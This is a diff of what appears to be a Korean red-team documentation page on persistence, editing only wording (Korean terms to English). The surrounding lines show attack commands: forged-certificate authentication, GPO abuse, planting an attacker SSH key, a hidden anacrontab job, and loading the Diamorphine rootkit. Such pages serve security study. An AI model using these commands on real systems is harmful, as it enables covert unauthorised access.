@@ -222,7 +222,7 @@ certipy auth -pfx forged.pfx -dc-ip DC_IP
 
 ### GPO (Group Policy Object) Persistence
 
-GPO를 수정하여 시작 시 페이로드 실행, Scheduled Task 배포 등.
+GPO를 수정하여 시작 시 payload 실행, Scheduled Task 배포 등.
 
 ```powershell
 # SharpGPOAbuse (GPO 편집 권한 필요)
@@ -245,7 +245,7 @@ gpupdate /force
 ### SSH Key
 
 ```bash
-# 공격자의 SSH 공개키를 타겟에 추가
+# 공격자의 SSH 공개키를 target에 추가
 echo "<attacker_pubkey>" >> ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 ```
@@ -472,7 +472,7 @@ echo '1 5 jobname /tmp/.b' >> /etc/anacrontab
 
 ### Rootkit (LKM)
 
-호스트와 동일 커널 헤더로 빌드 필요. 탐지 회피력 가장 높지만 운영 안정성 위험.
+호스트와 동일 커널 header로 build 필요. 탐지 회피력 가장 높지만 운영 안정성 위험.
 
 ```bash
 # 학습용 PoC (KoviD, Diamorphine 등)
@@ -508,4 +508,4 @@ insmod diamorphine.ko
 !!! info "관련 페이지"
     - Golden/Silver Ticket 상세 → [AD 환경 공격](../ad/ad-environment.md)
     - 탐지 회피 → [방어 우회](../evasion/index.md)
-    - 자격 증명 획득 → [자격 증명 획득](../lifecycle/credential-access.md)
+    - credential 획득 → [credential 획득](../lifecycle/credential-access.md)
